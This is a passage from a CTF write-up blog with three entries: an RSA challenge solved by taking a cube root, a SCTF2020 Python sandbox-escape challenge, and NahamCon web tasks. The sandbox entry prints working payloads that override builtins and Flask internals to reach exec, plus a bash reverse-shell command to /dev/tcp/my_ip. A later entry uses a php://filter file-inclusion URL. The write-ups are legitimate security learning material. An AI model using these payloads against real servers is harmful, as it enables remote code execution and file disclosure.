class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,inverse,bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">r=getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    q = <span class="number">5</span>*p+i</span><br><span class="line">    <span class="keyword">if</span> isprime(q):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n=p*q*r</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = pow(m,e,n)</span><br><span class="line">p3 = pow(p,<span class="number">3</span>,n)</span><br><span class="line">q3 = pow(q,<span class="number">3</span>,n)</span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line"><span class="keyword">print</span> e</span><br><span class="line"><span class="keyword">print</span> n</span><br><span class="line"><span class="keyword">print</span> p3</span><br><span class="line"><span class="keyword">print</span> q3</span><br><span class="line"></span><br><span class="line"><span class="comment">#c=121836624300974075697021410307617877799398704636412997043885070081959280989429720121505939271618801519845564677294487289085261071864489530938936756975266796724602572135614554790383740417604947122325421381322155502222532570899845171858215244411945889235509975121332503672838693190271397334662495169940649349725607212867270114445618201171582223868214171942753939282404133460110489725340075179818856587044172460703519751189284498768640898837525773823127259807337383870535232880471869465188882667401540052151795173003568424369575866780354852158304748299284900468768898966143729562589110027789165774068500360970335261801131264801996703446527156709491597639262305131309592217711956181866054589085773085822482247966030763162382493197473555330201343835684065991963179440335668817727280429581864224497755004825170263803174390985868997862117983334405815543271969716910040927833496696049703621334172902517666284662473059140662717708823</span></span><br><span class="line"><span class="comment">#e=65537</span></span><br><span class="line"><span class="comment">#n=20361372240024088786698455948788052559208001789410016096382703853157107986024860262721685000417719260611935731634077852127432140361792767202581631816544546972750034494061276779878409544779707914261679633764772575040304712361634318086289783951555842021028438799649252652041211341825451500751760872572402250747982495384263677669526575825183733353800694161425360299521143726681387485097281832219009682768523304737252763907939642212542959846630464628135025203489075698699980715986689341069964387779523254203021424865355054215122316160201073604105317768112281914334065349420946717116563634883368316247495042216330408372176714499012778410160478384503335610321108263706243329745785632599707740534386988945259578897614317582546751658480917188464178997026284336861027299289073045677754342746386408505695243800685323283852020325044649604548575089927541935884800327121875191739922436199496098842684301207745090701158839031935190703347091</span></span><br><span class="line"><span class="comment">#p3=3639847731266473012111996909765465259684540134584180368372338570948892196816095838781423020996407457408188225238520927483809091079993151555076781372882518810174687150067903870448436299501557380508793238254471833275507634732947964907461619182112787911133054275872120243558556697900528427679352181961312958660881800731678134481664074711076672290178389996403357076809805422591851145306425951725627843352207233693810474618882394140691334742086008967260117740486955640068190440609984095657695423536016475468229419187489359563800737261212975921663803729112420222039005478830477455592167092520074509241894829304209406713781082959299623674294927249556083486223036858674077173104518013601628447504500606447821540687465361616447631579976579754996021653630804073535352129315413118764836270751250405649683786487251823247828947202336680538849571498780353357272103697510910576879383751704763858882439578045020243015928994208017750848637513</span></span><br><span class="line"><span class="comment">#q3=7030777127779173206633582847346001157991477456002191926122836599155148909465054067800807615361108442560942058865403188672629297039703065927801771646334817871335134889139894648729527452541098449842202838983982508551750669662540615534327150829869964429006130891731472099912937717406120443380283548571270317421722042835639732966975812764084015221255115940508456442279902250677665136380988902682370875602145833135937210740790528756301051981994351553247852018355526641012434670664732924491790949235519600899289515495046353559475806935200029321563549553167235419039924276406059858659476329718809657072997385947262654743181242885709558209249589482036673428723035300722280229192727192487772217518673838209646300548275957450994828221329299666216457961746189885356929698674294944243729739850927111231235060005119781652245234537583181232715964191675241206562888107252569566488402724441835466680342239244581162530424964324562530832713397</span></span><br></pre></td></tr></table></figure><p>眨眼一看,一个‘普通’RSA，但细看发现。p、q都被立方并与n相模。但<code>n=p*q*r</code>、p与r经过getPrime(1024)随机生成。q的生成中经过至少经过一次<code>q = 5*p+i</code>。因此p**3大概率小于n。因此可以直接开三次方根的p。(后来sw0r3d师傅说这个方法不好，应该预期解用ralate attack)。再逆向得到r、q。</p><p>payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on Sun Jul 25 23:22:10 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: 冰之幻魄</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,inverse,bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c=<span class="number">121836624300974075697021410307617877799398704636412997043885070081959280989429720121505939271618801519845564677294487289085261071864489530938936756975266796724602572135614554790383740417604947122325421381322155502222532570899845171858215244411945889235509975121332503672838693190271397334662495169940649349725607212867270114445618201171582223868214171942753939282404133460110489725340075179818856587044172460703519751189284498768640898837525773823127259807337383870535232880471869465188882667401540052151795173003568424369575866780354852158304748299284900468768898966143729562589110027789165774068500360970335261801131264801996703446527156709491597639262305131309592217711956181866054589085773085822482247966030763162382493197473555330201343835684065991963179440335668817727280429581864224497755004825170263803174390985868997862117983334405815543271969716910040927833496696049703621334172902517666284662473059140662717708823</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=<span class="number">20361372240024088786698455948788052559208001789410016096382703853157107986024860262721685000417719260611935731634077852127432140361792767202581631816544546972750034494061276779878409544779707914261679633764772575040304712361634318086289783951555842021028438799649252652041211341825451500751760872572402250747982495384263677669526575825183733353800694161425360299521143726681387485097281832219009682768523304737252763907939642212542959846630464628135025203489075698699980715986689341069964387779523254203021424865355054215122316160201073604105317768112281914334065349420946717116563634883368316247495042216330408372176714499012778410160478384503335610321108263706243329745785632599707740534386988945259578897614317582546751658480917188464178997026284336861027299289073045677754342746386408505695243800685323283852020325044649604548575089927541935884800327121875191739922436199496098842684301207745090701158839031935190703347091</span></span><br><span class="line">p3=<span class="number">3639847731266473012111996909765465259684540134584180368372338570948892196816095838781423020996407457408188225238520927483809091079993151555076781372882518810174687150067903870448436299501557380508793238254471833275507634732947964907461619182112787911133054275872120243558556697900528427679352181961312958660881800731678134481664074711076672290178389996403357076809805422591851145306425951725627843352207233693810474618882394140691334742086008967260117740486955640068190440609984095657695423536016475468229419187489359563800737261212975921663803729112420222039005478830477455592167092520074509241894829304209406713781082959299623674294927249556083486223036858674077173104518013601628447504500606447821540687465361616447631579976579754996021653630804073535352129315413118764836270751250405649683786487251823247828947202336680538849571498780353357272103697510910576879383751704763858882439578045020243015928994208017750848637513</span></span><br><span class="line">q3=<span class="number">7030777127779173206633582847346001157991477456002191926122836599155148909465054067800807615361108442560942058865403188672629297039703065927801771646334817871335134889139894648729527452541098449842202838983982508551750669662540615534327150829869964429006130891731472099912937717406120443380283548571270317421722042835639732966975812764084015221255115940508456442279902250677665136380988902682370875602145833135937210740790528756301051981994351553247852018355526641012434670664732924491790949235519600899289515495046353559475806935200029321563549553167235419039924276406059858659476329718809657072997385947262654743181242885709558209249589482036673428723035300722280229192727192487772217518673838209646300548275957450994828221329299666216457961746189885356929698674294944243729739850927111231235060005119781652245234537583181232715964191675241206562888107252569566488402724441835466680342239244581162530424964324562530832713397</span></span><br><span class="line"></span><br><span class="line">p= int(gmpy2.iroot( p3, <span class="number">3</span>)[<span class="number">0</span>])</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    q = <span class="number">5</span>*p+i</span><br><span class="line">    <span class="keyword">if</span> isprime(q):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">r=n//p//q</span><br><span class="line">d = gmpy2.invert(e,(q<span class="number">-1</span>)*(p<span class="number">-1</span>)*(r<span class="number">-1</span>))</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> (long_to_bytes(m))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sctf2020 pythonbox题目复现小记</title>
      <link href="/2020/07/15/rgbCTF--wp/"/>
      <url>/2020/07/15/rgbCTF--wp/</url>
      
        <content type="html"><![CDATA[<p>比赛中觉得这道题有点意思,解题的思路也用很多(虽然都是函数劫持但很巧妙),有的构思十分恰妙,故写文以记下.</p><a id="more"></a><p>我这里因为环境有问题,本地post数据会蜜汁丢失(tcl,还没找到原因),所以把原题中的post部分改成了get但对思路来说无伤大雅.具体代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=["GET"])#源题是methods=["POST"]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">security</span><span class="params">()</span>:</span></span><br><span class="line">    secret =request.args[<span class="string">"cmd"</span>]<span class="comment">#源题是request.form</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> secret:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">42</span> &lt;= ord(i) &lt;= <span class="number">122</span>: <span class="keyword">return</span> <span class="string">"error!"</span></span><br><span class="line">   </span><br><span class="line">    exec(secret)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"xXXxXXx"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>)</span><br></pre></td></tr></table></figure><p>由于出题人要求要rec，so题目的核心在于如何在：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> secret:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">42</span> &lt;= ord(i) &lt;= <span class="number">122</span>: <span class="keyword">return</span> <span class="string">"error!"</span></span><br></pre></td></tr></table></figure><p>即，没有引号、小括号、空格的情况下函数调用或继承链的构建。</p><p>在python中没有大小引号，我们就没法构件字符串。而命令执行函数调用的参数需要是字符串，继承链的构建中也需要字符串来做索引。</p><h3 id="构造字符串"><a href="#构造字符串" class="headerlink" title="构造字符串"></a>构造字符串</h3><p>先说下没有引号怎么构造吧。</p><p>1.利用<code>flask.__dor__</code>构造,<code>flask.__dor__</code>会返回字符串利用python字符串特性进行切片拼接.</p><p>2.利用request.host、request.content_md5、request.content_encoding这些返回值直接就是字符串的request属性获取字符串。</p><p>3.利用i，secret这些已存在的字符串进行处理后，作为request.args/request.form的索引进行传参。</p><h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>有了字符串后，我们就可以编造一些简单的继承链来修改一些配置与函数了，但是依然不能调用命令执行相关的函数，因为在python如要对函数进行有参数的调用必须要小括号。所以如何调用命令执行相关的函数是一个问题。</p><h4 id="劫持ord函数"><a href="#劫持ord函数" class="headerlink" title="劫持ord函数"></a>劫持ord函数</h4><p>由于ord函数是在<code>__builtins__</code>里，我们可以通过继承链关系找到<code>__builtins__.__dict__[‘ord’]</code>再用一个返回值在42与122间的函数覆盖它，这样我们第二次访问时 ，无论传入什么函数都可以绕过bypass。</p><p>这里有个小技巧，在lambda构造有默认参数的匿名函数时不需要空格来区分形参，只需要在形参面前加个<code>*</code>号。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">'ord'</span>] = <span class="keyword">lambda</span>*args:<span class="number">42</span></span><br></pre></td></tr></table></figure><p> 这样，调用ord时，ord无论参数是什么都只能返回42。</p><p>完整payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#第一次</span></span><br><span class="line">cmd=__builtins__.__dict__[request.content_md5] = <span class="keyword">lambda</span>*args:<span class="number">42</span></span><br><span class="line">在包中添加头： content_md5:ord</span><br><span class="line"><span class="comment">#第二次</span></span><br><span class="line">cmd=__import__(<span class="string">'os'</span>).system(\<span class="string">"bash -c 'bash -i &gt;&amp; /dev/tcp/my_ip/23333 0&gt;&amp;1'\")</span></span><br></pre></td></tr></table></figure><h4 id="patch-flask自己的函数"><a href="#patch-flask自己的函数" class="headerlink" title="patch flask自己的函数"></a>patch flask自己的函数</h4><p>我们在审计flask代码时，会发现几个有趣的参数finalize_request、process_response、after_request_functions。他们在flask中的运行机制是</p><p>1。一旦web应用接收到reques，会调用finalize_request。</p><p>2。finalize_request首先会对请求使用make_response方法进行处理，该方法会将视图函数的返回值（response对象或者一个元组）封装成一个response对象。</p><p>3。调用 process_response 方法，使用 after_request_functions 当中的函数进行处理，返回处理过后的response。</p><p>4。如果抛出异常，raise</p><p>因此我们可以：</p><p>让<code>process_response=exec</code>,<code>make_response</code>值为我们想执行的代码</p><p>具体操作如下：</p><p>方法1：直接更改process_response</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?cmd=Flask.__doc__=request.args[secret[0]];app.make_response=lambda*p:Flask.__doc__;app.process_response=exec;&amp;F=print(‘lexsd6’)</span><br></pre></td></tr></table></figure><p><img src="image-20200715001759238.png" alt="image-20200715001759238"></p><p>方法2：通过after_request_functions更改process_response：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?cmd=Flask.__doc__=request.args[secret[0]];app.make_response=lambda*p:Flask.__doc__;app.after_request_funcs[None]=[exec];&amp;F=print(‘lexsd6’)</span><br></pre></td></tr></table></figure><p><img src="image-20200715142352986.png" alt="image-20200715142352986"></p><h4 id="patch-url-parse"><a href="#patch-url-parse" class="headerlink" title="patch url_parse"></a>patch url_parse</h4><p>url_parse  是一个处理url的函数我们可以让它为eval,这样url中<code>/</code>后的数据将会当成eval的参数来执行.</p><p>具体可以看官方wp:</p><p><a href="https://ctftime.org/writeup/22157" target="_blank" rel="noopener">https://ctftime.org/writeup/22157</a></p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="https://pham-nuwens-document.readthedocs.io/zh/latest/flask%E5%AD%A6%E4%B9%A0/flask%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3.html" target="_blank" rel="noopener">flask流程详解</a></p><p><a href="https://imagin.vip/?p=1489#pysandbox" target="_blank" rel="noopener">https://imagin.vip/?p=1489#pysandbox</a></p><p><a href="http://www.l-team.org/archives/379.html" target="_blank" rel="noopener">http://www.l-team.org/archives/379.html</a></p><p><a href="https://ctftime.org/writeup/22157" target="_blank" rel="noopener">https://ctftime.org/writeup/22157</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NahamCon CTF WP</title>
      <link href="/2020/06/18/NahamCon%20CTF%20WP/"/>
      <url>/2020/06/18/NahamCon%20CTF%20WP/</url>
      
        <content type="html"><![CDATA[<p>某周末,在某大佬的推荐下打了下NahamCon CTF在最后几小时里体验了下这真’雨露均沾’的ctf的感觉.(但菜还是菜这点没变(눈_눈)  )</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Agent-95"><a href="#Agent-95" class="headerlink" title="Agent 95"></a>Agent 95</h3><p>进入题目，看到</p><p><img src="C:%5CUsers%5Clexs%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200615234157462.png" alt="image-20200615234157462"></p><p>分析要抓包改header，User-Agent改成: Mozilla/4.0(compatible;MSIE6.0;Windows 95)</p><p><img src="image-20200615235227934.png" alt="image-20200615235227934"></p><h3 id="Localghost"><a href="#Localghost" class="headerlink" title="Localghost"></a>Localghost</h3><p>进入题目 F12查看原代码，发现可疑js。</p><p><img src="image-20200615235426204.png" alt="image-20200615235426204"></p><p>进入<a href="http://jh2i.com:50003/jquery.jscroll2.js看到" target="_blank" rel="noopener">http://jh2i.com:50003/jquery.jscroll2.js看到</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var _0xbcec&#x3D;[&quot;\x75\x73\x65\x20\x73\x74\x72\x69\x63\x74&quot;,&quot;\x6A\x73\x63\x72\x6F\x6C\x6C&quot;,&quot;\x3C\x73\x6D\x61\x6C\x6C\x3E\x4C\x6F\x61\x64\x69\x6E\x67\x2E\x2E\x2E\x3C\x2F\x73\x6D\x61\x6C\x6C\x3E&quot;,&quot;\x61\x3A\x6C\x61\x73\x74&quot;,&quot;&quot;,&quot;\x66\x6C\x61\x67&quot;,&quot;\x53\x6B\x4E\x55\x52\x6E\x74\x7A\x63\x47\x39\x76\x62\x32\x39\x76\x61\x33\x6C\x66\x5A\x32\x68\x76\x63\x33\x52\x7A\x58\x32\x6C\x75\x58\x33\x4E\x30\x62\x33\x4A\x68\x5A\x32\x56\x39&quot;,&quot;\x73\x65\x74\x49\x74\x65\x6D&quot;,&quot;\x6C\x6F\x63\x61\x6C\x53\x74\x6F\x72\x61\x67\x65&quot;,&quot;\x64\x61\x74\x61&quot;,&quot;\x66\x75\x6E\x63\x74\x69\x6F\x6E&quot;,&quot;\x64\x65\x66\x61\x75\x6C\x74\x73&quot;,&quot;\x65\x78\x74\x65\x6E\x64&quot;,&quot;\x6F\x76\x65\x72\x66\x6C\x6F\x77\x2D\x79&quot;,&quot;\x63\x73\x73&quot;,&quot;\x76\x69\x73\x69\x62\x6C\x65&quot;,&quot;\x66\x69\x72\x73\x74&quot;,&quot;\x6E\x65\x78\x74\x53\x65\x6C\x65\x63\x74\x6F\x72&quot;,&quot;\x66\x69\x6E\x64&quot;,&quot;\x62\x6F\x64\x79&quot;,&quot;\x68\x72\x65\x66&quot;,&quot;\x61\x74\x74\x72&quot;,&quot;\x20&quot;,&quot;\x63\x6F\x6E\x74\x65\x6E\x74\x53\x65\x6C\x65\x63\x74\x6F\x72&quot;,&quot;\x74\x72\x69\x6D&quot;,&quot;\x73\x72\x63&quot;,&quot;\x69\x6D\x67&quot;,&quot;\x66\x69\x6C\x74\x65\x72&quot;,&quot;\x6C\x6F\x61\x64\x69\x6E\x67\x48\x74\x6D\x6C&quot;,&quot;\x6C\x65\x6E\x67\x74\x68&quot;,&quot;\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x69\x6E\x6E\x65\x72&quot;,&quot;\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x69\x6E\x6E\x65\x72\x22\x20\x2F\x3E&quot;,&quot;\x77\x72\x61\x70\x41\x6C\x6C&quot;,&quot;\x63\x6F\x6E\x74\x65\x6E\x74\x73&quot;,&quot;\x70\x61\x67\x69\x6E\x67\x53\x65\x6C\x65\x63\x74\x6F\x72&quot;,&quot;\x68\x69\x64\x65&quot;,&quot;\x63\x6C\x6F\x73\x65\x73\x74&quot;,&quot;\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x6E\x65\x78\x74\x2D\x70\x61\x72\x65\x6E\x74&quot;,&quot;\x61\x64\x64\x43\x6C\x61\x73\x73&quot;,&quot;\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x69\x6E\x6E\x65\x72\x2C\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x61\x64\x64\x65\x64&quot;,&quot;\x6E\x6F\x74&quot;,&quot;\x70\x61\x72\x65\x6E\x74&quot;,&quot;\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x6E\x65\x78\x74\x2D\x70\x61\x72\x65\x6E\x74\x22\x20\x2F\x3E&quot;,&quot;\x77\x72\x61\x70&quot;,&quot;\x75\x6E\x77\x72\x61\x70&quot;,&quot;\x63\x68\x69\x6C\x64\x72\x65\x6E&quot;,&quot;\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x61\x64\x64\x65\x64&quot;,&quot;\x72\x65\x6D\x6F\x76\x65\x44\x61\x74\x61&quot;,&quot;\x2E\x6A\x73\x63\x72\x6F\x6C\x6C&quot;,&quot;\x75\x6E\x62\x69\x6E\x64&quot;,&quot;\x64\x69\x76\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x69\x6E\x6E\x65\x72&quot;,&quot;\x62\x6F\x72\x64\x65\x72\x54\x6F\x70\x57\x69\x64\x74\x68&quot;,&quot;\x70\x61\x64\x64\x69\x6E\x67\x54\x6F\x70&quot;,&quot;\x73\x63\x72\x6F\x6C\x6C\x54\x6F\x70&quot;,&quot;\x74\x6F\x70&quot;,&quot;\x6F\x66\x66\x73\x65\x74&quot;,&quot;\x68\x65\x69\x67\x68\x74&quot;,&quot;\x63\x65\x69\x6C&quot;,&quot;\x77\x61\x69\x74\x69\x6E\x67&quot;,&quot;\x70\x61\x64\x64\x69\x6E\x67&quot;,&quot;\x6F\x75\x74\x65\x72\x48\x65\x69\x67\x68\x74&quot;,&quot;\x69\x6E\x66\x6F&quot;,&quot;\x6A\x53\x63\x72\x6F\x6C\x6C\x3A&quot;,&quot;\x66\x72\x6F\x6D\x20\x62\x6F\x74\x74\x6F\x6D\x2E\x20\x4C\x6F\x61\x64\x69\x6E\x67\x20\x6E\x65\x78\x74\x20\x72\x65\x71\x75\x65\x73\x74\x2E\x2E\x2E&quot;,&quot;\x6E\x65\x78\x74\x48\x72\x65\x66&quot;,&quot;\x77\x61\x72\x6E&quot;,&quot;\x6A\x53\x63\x72\x6F\x6C\x6C\x3A\x20\x6E\x65\x78\x74\x53\x65\x6C\x65\x63\x74\x6F\x72\x20\x6E\x6F\x74\x20\x66\x6F\x75\x6E\x64\x20\x2D\x20\x64\x65\x73\x74\x72\x6F\x79\x69\x6E\x67&quot;,&quot;\x61\x75\x74\x6F\x54\x72\x69\x67\x67\x65\x72&quot;,&quot;\x61\x75\x74\x6F\x54\x72\x69\x67\x67\x65\x72\x55\x6E\x74\x69\x6C&quot;,&quot;\x73\x63\x72\x6F\x6C\x6C\x2E\x6A\x73\x63\x72\x6F\x6C\x6C&quot;,&quot;\x62\x69\x6E\x64&quot;,&quot;\x63\x6C\x69\x63\x6B\x2E\x6A\x73\x63\x72\x6F\x6C\x6C&quot;,&quot;\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x6C\x6F\x61\x64\x69\x6E\x67\x22\x3E&quot;,&quot;\x3C\x2F\x64\x69\x76\x3E&quot;,&quot;\x68\x74\x6D\x6C&quot;,&quot;\x6C\x61\x73\x74&quot;,&quot;\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x61\x64\x64\x65\x64\x22\x20\x2F\x3E&quot;,&quot;\x61\x70\x70\x65\x6E\x64&quot;,&quot;\x65\x72\x72\x6F\x72&quot;,&quot;\x72\x65\x6D\x6F\x76\x65&quot;,&quot;\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x6E\x65\x78\x74\x2D\x70\x61\x72\x65\x6E\x74&quot;,&quot;\x63\x61\x6C\x6C\x62\x61\x63\x6B&quot;,&quot;\x63\x61\x6C\x6C&quot;,&quot;\x64\x69\x72&quot;,&quot;\x6C\x6F\x61\x64&quot;,&quot;\x64\x69\x76\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x61\x64\x64\x65\x64&quot;,&quot;\x61\x6E\x69\x6D\x61\x74\x65&quot;,&quot;\x64\x65\x62\x75\x67&quot;,&quot;\x6F\x62\x6A\x65\x63\x74&quot;,&quot;\x61\x70\x70\x6C\x79&quot;,&quot;\x6C\x6F\x67&quot;,&quot;\x73\x6C\x69\x63\x65&quot;,&quot;\x70\x72\x6F\x74\x6F\x74\x79\x70\x65&quot;,&quot;\x66\x6E&quot;,&quot;\x69\x6E\x69\x74\x69\x61\x6C\x69\x7A\x65\x64&quot;,&quot;\x65\x61\x63\x68&quot;];</span><br></pre></td></tr></table></figure><p>转为utf-8得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#39;use strict&#39;, &#39;jscroll&#39;, &#39;&lt;small&gt;Loading...&lt;&#x2F;small&gt;&#39;, &#39;a:last&#39;, &#39;&#39;, &#39;flag&#39;, &#39;SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9&#39;, &#39;setItem&#39;, &#39;localStorage&#39;, &#39;data&#39;, &#39;function&#39;, &#39;defaults&#39;, &#39;extend&#39;, &#39;overflow-y&#39;, &#39;css&#39;, &#39;visible&#39;, &#39;first&#39;, &#39;nextSelector&#39;, &#39;find&#39;, &#39;body&#39;, &#39;href&#39;, &#39;attr&#39;, &#39; &#39;, &#39;contentSelector&#39;, &#39;trim&#39;, &#39;src&#39;, &#39;img&#39;, &#39;filter&#39;, &#39;loadingHtml&#39;, &#39;length&#39;, &#39;.jscroll-inner&#39;, &#39;&lt;div class&#x3D;&quot;jscroll-inner&quot; &#x2F;&gt;&#39;, &#39;wrapAll&#39;, &#39;contents&#39;, &#39;pagingSelector&#39;, &#39;hide&#39;, &#39;closest&#39;, &#39;jscroll-next-parent&#39;, &#39;addClass&#39;, &#39;.jscroll-inner,.jscroll-added&#39;, &#39;not&#39;, &#39;parent&#39;, &#39;&lt;div class&#x3D;&quot;jscroll-next-parent&quot; &#x2F;&gt;&#39;, &#39;wrap&#39;, &#39;unwrap&#39;, &#39;children&#39;, &#39;.jscroll-added&#39;, &#39;removeData&#39;, &#39;.jscroll&#39;, &#39;unbind&#39;, &#39;div.jscroll-inner&#39;, &#39;borderTopWidth&#39;, &#39;paddingTop&#39;, &#39;scrollTop&#39;, &#39;top&#39;, &#39;offset&#39;, &#39;height&#39;, &#39;ceil&#39;, &#39;waiting&#39;, &#39;padding&#39;, &#39;outerHeight&#39;, &#39;info&#39;, &#39;jScroll:&#39;, &#39;from bottom. Loading next request...&#39;, &#39;nextHref&#39;, &#39;warn&#39;, &#39;jScroll: nextSelector not found - destroying&#39;, &#39;autoTrigger&#39;, &#39;autoTriggerUntil&#39;, &#39;scroll.jscroll&#39;, &#39;bind&#39;, &#39;click.jscroll&#39;, &#39;&lt;div class&#x3D;&quot;jscroll-loading&quot;&gt;&#39;, &#39;&lt;&#x2F;div&gt;&#39;, &#39;html&#39;, &#39;last&#39;, &#39;&lt;div class&#x3D;&quot;jscroll-added&quot; &#x2F;&gt;&#39;, &#39;append&#39;, &#39;error&#39;, &#39;remove&#39;, &#39;.jscroll-next-parent&#39;, &#39;callback&#39;, &#39;call&#39;, &#39;dir&#39;, &#39;load&#39;, &#39;div.jscroll-added&#39;, &#39;animate&#39;, &#39;debug&#39;, &#39;object&#39;, &#39;apply&#39;, &#39;log&#39;, &#39;slice&#39;, &#39;prototype&#39;, &#39;fn&#39;, &#39;initialized&#39;, &#39;each&#39;]</span><br></pre></td></tr></table></figure><p>将flag 进行base64解密：JCTF{spoooooky_ghosts_in_storage}</p><h3 id="Phphonebook"><a href="#Phphonebook" class="headerlink" title="Phphonebook"></a>Phphonebook</h3><p>进入题目发现疑有文件包含漏洞，</p><p>构造: <a href="http://jh2i.com:50002/?file=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" 